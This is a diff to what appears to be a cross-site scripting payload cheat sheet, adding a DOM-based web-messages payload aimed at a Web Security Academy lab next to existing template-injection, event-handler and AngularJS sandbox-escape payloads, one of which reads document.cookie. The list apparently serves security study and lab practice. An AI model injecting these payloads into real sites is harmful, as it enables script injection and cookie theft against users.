@@ -131,6 +131,12 @@ ${alert(1)}
 http://xxxxx.com?&apos;-alert(414)-&apos;
 <xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
 
+
+//dom 
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"> //web messages and a JavaScript URL
+
+
+
 //angular
 {{$on.constructor('alert(1)')()}}
 ```
